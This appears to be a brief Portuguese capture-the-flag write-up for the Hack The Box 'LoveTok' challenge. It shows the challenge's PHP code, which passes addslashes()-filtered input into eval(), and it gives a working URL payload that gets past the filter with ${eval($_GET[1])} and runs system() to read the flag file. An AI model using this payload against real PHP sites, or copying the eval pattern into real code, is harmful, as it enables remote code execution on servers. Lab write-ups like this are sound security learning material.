#ctf 

https://app.hackthebox.com/challenges/lovetok

A página é bem simples e possui um parâmetro de formatação (no caso r) para a data que é imprimida.

O ctf contém arquivos para baixar e nele é possível ver qual a lógica da página. Ela usa a função `addslashes()` para previnir ataque RCE.

```php
<?php  
class TimeModel  
{  
   public function __construct($format)  
   {  
       $this->format = addslashes($format);  
  
       [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];  
       $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";  
   }  
  
   public function getTime()  
   {  
       eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');  
       return isset($time) ? $time : 'Something went terribly wrong';  
   }  
}

```

Achei este [artigo](https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php) ensinando como burlar esta função através da função `var_dump()`.

```
http://IP:PORT/?format=var_dump(${eval($_GET[1])}=r)&1=system(%22cat%20/flagoS2W9%20%22);
```

GG